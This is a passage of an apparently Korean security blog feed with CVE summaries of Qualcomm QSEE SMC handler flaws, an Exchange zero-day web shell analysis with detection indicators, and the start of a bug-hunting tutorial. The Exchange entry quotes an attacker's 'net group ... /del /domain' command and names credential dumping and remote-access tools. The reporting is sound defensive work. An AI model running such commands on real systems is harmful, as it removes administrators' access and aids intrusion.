<code>arg1</code>, <code>arg2</code>&#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>arg2</code>&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD574; 1 &#xB610;&#xB294; 2&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294;&#xB370;, <code>arg2</code>&#xAC00; REE &#xC601;&#xC5ED;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="CVE-2020-11257"><a href="#CVE-2020-11257" class="headerlink" title="CVE-2020-11257"></a>CVE-2020-11257</h3><p>SMC &#xD578;&#xB4E4;&#xB7EC; <code>usb_calib()</code> &#xC758; &#xC778;&#xC790; <code>arg1</code>&#xB294; &#xC0AD;&#xC81C;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCD9C;&#xB825; &#xD3EC;&#xC778;&#xD130;&#xB85C;, <code>arg1</code>&#xB294; &#xBA54;&#xBAA8;&#xB9AC; <code>0x580e0</code>&#xC758; &#xAC12;&#xC778; <code>0x787</code>&#xC744; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xC5ED;&#xCC38;&#xC870; &#xB418;&#xBA70;  <code>arg1</code>&#xC774; REE &#xC601;&#xC5ED;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="CVE-2020-11258"><a href="#CVE-2020-11258" class="headerlink" title="CVE-2020-11258"></a>CVE-2020-11258</h3><p>SMC &#xD578;&#xB4E4;&#xB7EC; <code>tzbsp_version_set()</code> &#xD568;&#xC218;&#xB294; &#xB124; &#xAC1C;&#xC758; &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xC73C;&#xBA70; &#xC778;&#xC790; &#xAC12;&#xC5D0; &#xB530;&#xB77C;  <code>arg3</code>&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD574; <code>0x0</code>, <code>0x5</code>, <code>0xfffffffc</code> &#xC911; &#xD558;&#xB098;&#xB97C; &#xC501;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>arg3</code>&#xAC00; REE &#xC601;&#xC5ED;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="CVE-2020-11259"><a href="#CVE-2020-11259" class="headerlink" title="CVE-2020-11259"></a>CVE-2020-11259</h3><p>SMC &#xD578;&#xB4E4;&#xB7EC; <code>tzbsp_version_set()</code> &#xD568;&#xC218;&#xB294; &#xC138; &#xAC1C;&#xC758; &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; <code>arg2</code>&#xC5D0;&#xB294; <code>sub_87e90370</code> &#xC758; &#xBC18;&#xD658; &#xAC12; &#xB610;&#xB294; <code>sub_87e90370 | 0xF0000</code> &#xAC12;&#xC744;,<code>arg3</code>&#xC5D0;&#xB294; <code>0x0</code>&#xC744; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xAC01;&#xAC01; &#xC5ED;&#xCC38;&#xC870; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>arg2</code>&#xC640; <code>arg3</code>&#xAC00; REE &#xC601;&#xC5ED;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xB124; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBAA8;&#xB450; <code>SMC(Secure Monitor Call)</code> &#xD578;&#xB4E4;&#xB7EC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xACFC; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xD3EC;&#xC778;&#xD130;&#xAC00; REE &#xC601;&#xC5ED;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xACF5;&#xD1B5;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; QSEE&#xAC00; &#xC561;&#xC138;&#xC2A4; &#xAC00;&#xB2A5;&#xD55C; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC5D0; &#xC81C;&#xD55C;&#xB41C; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; QSEE&#xC5D0; &#xAD6C;&#xD604;&#xB41C; &#xBCF4;&#xC548; &#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD574; &#xCEE4;&#xB110; &#xBC0F; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC5D0; &#xC9C1;&#xC811; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>qualcomm</tag>
      
      <tag>L0ch</tag>
      
      <tag>limited memory overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft Exchange server 제로 데이 취약점 악용</title>
    <link href="/2021/03/08/idioth/2021-03-08/"/>
    <url>/2021/03/08/idioth/2021-03-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html">Detection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021&#xB144; 3&#xC6D4; 2&#xC77C; &#xC790; &#xD328;&#xCE58; &#xC774;&#xC804;&#xC758; Microsoft Exchange Server<ul><li>2013 Cumulative Update 23</li><li>2016 Cumulative Update 18</li><li>2016 Cumulative Update 19</li><li>2019 Cumulative Update 7</li><li>2019 Cumulative Update 8</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Exchange Server&#xC758; &#xC81C;&#xB85C; &#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD55C; &#xACF5;&#xACA9;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC1C;&#xACAC;&#xB41C; &#xD589;&#xC704;&#xB294; &#xC811;&#xC18D; &#xC720;&#xC9C0;&#xB97C; &#xC704;&#xD55C; &#xC6F9; &#xC258; &#xC0DD;&#xC131;, &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;, &#xC5D4;&#xB4DC; &#xD3EC;&#xC778;&#xD2B8; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158; &#xD0D0;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>2021&#xB144; 1&#xC6D4;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; <code>help.aspx</code> &#xC6F9; &#xC258;&#xC740; FireEye xAgent, CarbonBlack, CrowdStrike Falcon &#xC5D4;&#xB4DC; &#xD3EC;&#xC778;&#xD2B8; &#xC81C;&#xD488;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xACE0; &#xC874;&#xC7AC; &#xC5EC;&#xBD80;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC6F9; &#xC258;&#xC740; CVE-2021-26858&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; Microsoft Exchange Server&#xC758; &#xD1B5;&#xD569; &#xBA54;&#xC2DC;&#xC9D5; &#xC11C;&#xBE44;&#xC2A4;&#xC778; <code>UMWorkerProcess.exe</code>&#xB97C; &#xD1B5;&#xD574; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB978; &#xACF3;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; <code>iisstart.apsx</code> &#xC6F9; &#xC258;&#xC740; &#xBD80;&#xBD84;&#xC801;&#xC73C;&#xB85C; &#xB09C;&#xB3C5;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xACFC; &#xD1B5;&#xC2E0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAE30;&#xB2A5;, &#xC784;&#xC758; &#xBA85;&#xB839; &#xC2E4;&#xD589;, &#xC5C5;&#xB85C;&#xB4DC;, &#xC0AD;&#xC81C;, &#xD30C;&#xC77C; &#xB0B4;&#xC6A9; &#xD655;&#xC778; &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;.</p><p>2021&#xB144; 3&#xC6D4;&#xC5D0;&#xB294; Exchange Server&#xC758; &#xC5EC;&#xB7EC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xC6F9; &#xC258;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC6F9; &#xC258;&#xC740; Exchange &#xC6F9; &#xD504;&#xB860;&#xD2B8; &#xC5D4;&#xB4DC;&#xC640; &#xAD00;&#xB828;&#xB41C; IIS &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <code>w3wp.exe</code>&#xAC00; <code>cmd.exe</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p>&#xC704;&#xC758; &#xBC1C;&#xACAC;&#xB41C; &#xC6F9; &#xC258; &#xB2E4;&#xC218;&#xB294; <code>Exchange Organization administrators</code> &#xADF8;&#xB8F9;&#xC5D0;&#xC11C; <code>administrator</code> &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xB294; <code>net group &quot;Exchange Organization administrators&quot; administrator /del /domain</code> &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;, &#xB85C;&#xCEEC;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC774; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>Microsoft&#xC5D0;&#xC11C; &#xBC1D;&#xD78C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC545;&#xC6A9; &#xD589;&#xC704;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>LSASS &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504;&#xB97C; &#xD1B5;&#xD55C; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xB3C4;&#xC6A9;</li><li>7zip&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC720;&#xCD9C; &#xB370;&#xC774;&#xD130; &#xC555;&#xCD95;</li><li>Exchange PowerShell Snapin&#xC744; &#xD1B5;&#xD574; mailbox data &#xC804;&#xC1A1;</li><li>&#xC6D0;&#xACA9; &#xC811;&#xC18D;&#xC744; &#xC704;&#xD574; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; Covenant, Nishang, PowerCat &#xC0AC;&#xC6A9;</li></ul><p>Exchange Server&#xAC00; &#xC6F9; &#xC258;&#xC5D0; &#xACF5;&#xACA9;&#xC744; &#xBC1B;&#xC558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>C:\Windows\System32\inetsrv\w3wp.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>cmd.exe</code> &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xAC00;&#xC9D0;</li><li><code>w3wp.exe</code>&#xB098; <code>UMWorkerProcess.exe</code>&#xC5D0; &#xC758;&#xD574; &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;</li><li><code>SYSTEM</code> &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC18C;&#xC720;&#xD55C; ASPX &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;</li><li><code>Temporary ASP.NET Files</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xCC98;&#xC74C; &#xBCF4;&#xB294; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; ASPX &#xD30C;&#xC77C; &#xC874;&#xC7AC;</li><li>&#xB2E4;&#xC74C; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xB300;&#xD574; &#xC678;&#xBD80; IP&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.<ul><li><code>/rpc/</code> &#xB514;&#xB809;&#xD130;&#xB9AC;</li><li><code>/ecp/DDI/DDIService.svc/SetObject</code></li><li>&#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xB9AC;&#xC18C;&#xC2A4;</li><li>&#xC758;&#xC2EC;&#xC2A4;&#xB7FD;&#xAC70;&#xB098; &#xC2A4;&#xD478;&#xD551; &#xB41C; HTTP User-Agents</li></ul></li><li>&#xBA54;&#xC77C; &#xBC15;&#xC2A4;&#xB85C; &#xB0B4;&#xBCF4;&#xB0B4;&#xB294; &#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD558;&#xAC70;&#xB098; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; Exchange PowerShell Snapin request&#xAC00; &#xC874;&#xC7AC;</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 1</title>
    <link href="/2021/03/07/l0ch/bughunting-tutorial/"/>
    <url>/2021/03/07/l0ch/bughunting-tutorial/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC624;&#xB298;&#xC740; &#xD2B9;&#xBCC4;&#xD55C; &#xAE00;&#xC744; &#xAC00;&#xC838;&#xC640;&#xBD24;&#xC5B4;&#xC694; &#x314B;&#x314B;&#x314B; &#xBC14;&#xB85C; &#xB300;&#xD559;&#xAD50; &#xB3D9;&#xC544;&#xB9AC; &#xB300;-&#xC120;&#xBC30;&#xB2D8;&#xC758; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC5D0; &#xB300;&#xD55C; &#xAFC0;&#xD301;&#xC774; &#xB2F4;&#xACA8;&#xC788;&#xB294; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xB54C;&#xB294; 2018&#xB144;.. &#xC544;&#xC9C1; &#xC0C8;&#xB0B4;&#xAE30; &#xD2F0;&#xB97C; &#xBC97;&#xC5B4;&#xB098;&#xC9C0; &#xBABB;&#xD55C; &#xC800;&#xC5D0;&#xAC8C;</p><blockquote><p>&#xC708;&#xB3C4;&#xC6B0; &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xC544;&#xBCFC;&#xB798;?</p></blockquote><p>&#xB77C;&#xBA70; &#xC62C;&#xB824;&#xC8FC;&#xC2E0; &#xAE00;&#xC785;&#xB2C8;&#xB2E4; &#x314E;&#x314E;..  &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC5D0; &#xB300;&#xD55C; &#xC18C;&#xAC1C;&#xBD80;&#xD130;, &#xB300;&#xC0C1; &#xC120;&#xC815;-&#xBD84;&#xC11D;-&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xAE4C;&#xC9C0; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xB274;&#xBE44;&#xB3C4; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xCE5C;&#xC808;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xB3C4;&#xC6C0;&#xC774; &#xB9CE;&#xC774; &#xB418;&#xC5C8;&#xC8E0;. (&#xADF8;&#xB550; &#xBAB0;&#xB790;&#xC9C0; &#xC55E;&#xC73C;&#xB85C; &#xC708;&#xB3C4;&#xC6B0;&#xB85C; &#xACE0;&#xD1B5;&#xBC1B;&#xAC8C; &#xB420;&#xC9C0;&#x2026;..)</p><p>&#xC5EC;&#xD2BC; &#xADF8;&#xB798;&#xC11C; &#xD5C8;&#xB77D;&#xC744; &#xAD6C;&#xD558;&#xACE0; &#xC62C;&#xB9AC;&#xAC8C; &#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xAE34; &#xB9CC;&#xD07C; &#xB098;&#xB204;&#xC5B4;&#xC11C; &#xC62C;&#xB9B4; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xAC8C;&#xC2DC;&#xB97C; &#xD5C8;&#xB77D;&#xD574;&#xC8FC;&#xC2E0; &#xC120;&#xBC30;&#xB2D8;&#xAED8; &#xB2E4;&#xC2DC; &#xD55C;&#xBC88; &#xAC10;&#xC0AC;&#xC758; &#xB9D0;&#xC500;&#xC744; &#xB4DC;&#xB9AC;&#xBA70; &#xC2DC;&#xC791;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><hr><h1 id="&#xC11C;&#xB860;"><a href="#&#xC11C;&#xB860;" class="headerlink" title="&#xC11C;&#xB860;"></a>&#xC11C;&#xB860;</h1><p>&#xC74C; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC;&#xC774;&#xB77C;&#xB294; &#xAC70;&#xCC3D;&#xD55C; &#xC81C;&#xBAA9;&#xC744; &#xD574;&#xB3C4; &#xB420;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xC9C0;&#xB9CC; &#x314B;&#x314B;&#x314B; &#xC81C;&#xAC00; &#xCC3E;&#xC558;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC608;&#xC2DC;&#xB85C; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xACFC;&#xC815;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC598;&#xAE30;&#xD574; &#xBCF4;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBB50; &#xB300;&#xB2E8;&#xD55C; &#xAC8C; &#xC544;&#xB2C8;&#xB77C; &#xADF8;&#xB0E5; &#xC81C;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC558;&#xACE0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xD588;&#xB294;&#xC9C0; &#xC815;&#xB3C4;? &#xD0A4;&#xC0AC; &#xBCF4;&#xACE0;&#xC11C; &#xC4F0;&#xB294; &#xD301;&#xB3C4; &#xC880; &#xC368;&#xBCF4;&#xB824;&#xACE0; &#xD558;&#xB2E4;&#xAC00; &#xADF8;&#xB0E5; &#xBCF4;&#xACE0;&#xC11C;&#xB294; &#xCD5C;&#xB300;&#xD55C; &#xC790;&#xC138;&#xD788; &#xB9CE;&#xC774; &#xC4F0;&#xB294; &#xAC8C; &#xB2F5;&#xC778; &#xAC70; &#xAC19;&#xC544; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xBE7C;&#xACE0; &#xC598;&#xAE30;&#xD560; &#xAC70; &#xAC19;&#xB124;&#xC694; &#x314B;&#x314B;</p><p>&#xCD5C;&#xADFC;&#xC5D0;&#xB294; &#xACF5;&#xC720;&#xAE30;&#xB791; &#xBB50; IOT&#xAC00; &#xB300;&#xC138;&#xC5EC;&#xC11C; &#xC8FC;&#xBCC0;&#xC5D0; &#xC774;&#xB807;&#xAC8C; &#xC708;&#xB3C4;&#xC6B0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xBC84;&#xADF8; &#xD5CC;&#xD305;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC744; &#xB9CE;&#xC774; &#xBD24;&#xC9C0;&#xB9CC; &#xC708;&#xB3C4;&#xC6B0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xC2DC;&#xB824;&#xB294; &#xBD84;&#xB4E4;&#xAED8; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xD569;&#xB2C8;&#xB2E4; &#x314E;&#x314E; (&#xADF8;&#xB798;&#xB3C4; &#xACF5;&#xC720;&#xAE30;&#xAC00; &#xAC1C;&#xAFC0;&#xC784; &#x3160;&#x3160;)</p><p>&#xC774; &#xAE00;&#xC740; &#xC77D;&#xC73C;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xD0B9;&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xBCF8;&#xC9C0;&#xC2DD;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xC804;&#xC81C; &#xD558;&#xC5D0; &#xC4F0;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6CC;&#xAC8C;&#xC784;&#xB3C4; &#xD480;&#xC5B4;&#xBCF4;&#xACE0; &#xB9AC;&#xBC84;&#xC2F1; &#xC880; &#xD560; &#xC218; &#xC788;&#xACE0; &#xC815;&#xB3C4;&#x2026;.? &#xADF8;&#xB9AC;&#xACE0; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC744; &#xC544;&#xC608; &#xC548; &#xD574;&#xBCF4;&#xC2E0; &#xBD84;&#xB4E4;? &#xC560;&#xB9E4;&#xD558;&#xC9C0;&#xB9CC;&#x2026; &#xADF8;&#xB798;&#xB3C4; &#xCD5C;&#xB300;&#xD55C; &#xC27D;&#xAC8C; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC4F0;&#xB824;&#xACE0; &#xB178;&#xB825;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><h1 id="&#x203B;-&#xAE00;-&#xC77D;&#xC744;-&#xB54C;-&#xC8FC;&#xC758;&#xC0AC;&#xD56D;-&#x203B;"><a href="#&#x203B;-&#xAE00;-&#xC77D;&#xC744;-&#xB54C;-&#xC8FC;&#xC758;&#xC0AC;&#xD56D;-&#x203B;" class="headerlink" title="&#x203B; &#xAE00; &#xC77D;&#xC744; &#xB54C; &#xC8FC;&#xC758;&#xC0AC;&#xD56D; &#x203B;"></a>&#x203B; &#xAE00; &#xC77D;&#xC744; &#xB54C; &#xC8FC;&#xC758;&#xC0AC;&#xD56D; &#x203B;</h1><ol><li>&#xC774; &#xAE00;&#xC740; &#xC81C; &#xACBD;&#xD5D8;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC4F0;&#xB294; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD639;&#xC2DC; &#xB354; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC774;&#xB098; &#xC544;&#xC774;&#xB514;&#xC5B4; &#xC788;&#xC73C;&#xC2E0; &#xBD84;&#xC740; &#xB313;&#xAE00;&#xC744; &#xB2EC;&#xC544;&#xC8FC;&#xC2DC;&#xBA74; &#xAC10;&#xC0AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xAE00;&#xC758; &#xD750;&#xB984;&#xC740; &#xC81C; &#xC758;&#xC2DD;&#xC758; &#xD750;&#xB984;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC911;&#xAC04;&#xC5D0; &#xC774;&#xC57C;&#xAE30;&#xAC00; &#xB534; &#xB370;&#xB85C; &#xC0C8;&#xAC70;&#xB098; &#xC624;&#xD0C0;&#xAC00; &#xC788;&#xAC70;&#xB098; &#xC544;&#xB2C8;&#xBA74; &#xAC1C;&#xC18C;&#xB9AC;&#xB97C; &#xD558;&#xAC70;&#xB098;&#x2026;.</li><li>&#xCD5C;&#xB300;&#xD55C; &#xC81C;&#xAC00; &#xD588;&#xB358; &#xBC29;&#xBC95;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xC368;&#xB0BC; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xB294; &#xACFC;&#xC815;&#xB3C4; &#xC4F8; &#xC0DD;&#xAC01;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCC98;&#xC74C; &#xBCFC; &#xB54C;&#xBD80;&#xD130; &#xC9C1;&#xC811; &#xD558;&#xBA74;&#xC11C; &#xB530;&#xB77C;&#xAC00;&#xAE30;&#xBCF4;&#xB2E4;&#xB294; &#xD55C; &#xBC88; &#xC4F1; &#xBCF4;&#xACE0; &#xB530;&#xB77C; &#xD574; &#xBCF4;&#xC2DC;&#xB294; &#xAC78; &#xCD94;&#xCC9C;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;</li><li>&#xC81C;&#xAC00; &#xBB38;&#xACFC;&#xB3C4; &#xC544;&#xB2C8;&#xAC70;&#xB2C8;&#xC640; &#xD559;&#xCC3D; &#xC2DC;&#xC808;&#xC758; &#xC808;&#xBC18; &#xC774;&#xC0C1;&#xC744; &#xC911;&#xAD88;&#xC5D0;&#xC11C; &#xBCF4;&#xB0C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD55C;&#xCFF8;&#xB9D0;&#xC774; &#xCD78;&#xAE08; &#xBD80;&#xC871;&#xD569;&#xB2C8;&#xB370;&#xC2A4;.</li></ol><p>&#xBB50; &#xC554;&#xD2BC; &#xC2DC;&#xC791;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2F9; &#x314B;&#x314B;</p><h1 id="&#xBAA9;&#xCC28;"><a href="#&#xBAA9;&#xCC28;" class="headerlink" title="&#xBAA9;&#xCC28;"></a>&#xBAA9;&#xCC28;</h1><h3 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h3><ol><li>&#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC774;&#xB780;?</li><li>&#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC804;&#xC5D0;</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xBC29;&#xBC95;</li><li>&#xD0C0;&#xAE43; &#xC120;&#xC815;</li><li>&#xC2DC;&#xB4DC; &#xD30C;&#xC77C;</li></ol><h3 id="To-be-Continued&#x2026;"><a href="#To-be-Continued&#x2026;" class="headerlink" title="To be Continued&#x2026;"></a>To be Continued&#x2026;</h3><ol><li>&#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0; - KMPlayer</li><li>From Crash to Exploit</li><li>&#xC7A1;&#xB2F4;</li></ol><h1 id="&#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC774;&#xB780;"><a href="#&#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC774;&#xB780;" class="headerlink" title="&#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC774;&#xB780;?"></a>&#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC774;&#xB780;?</h1><p>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB098; 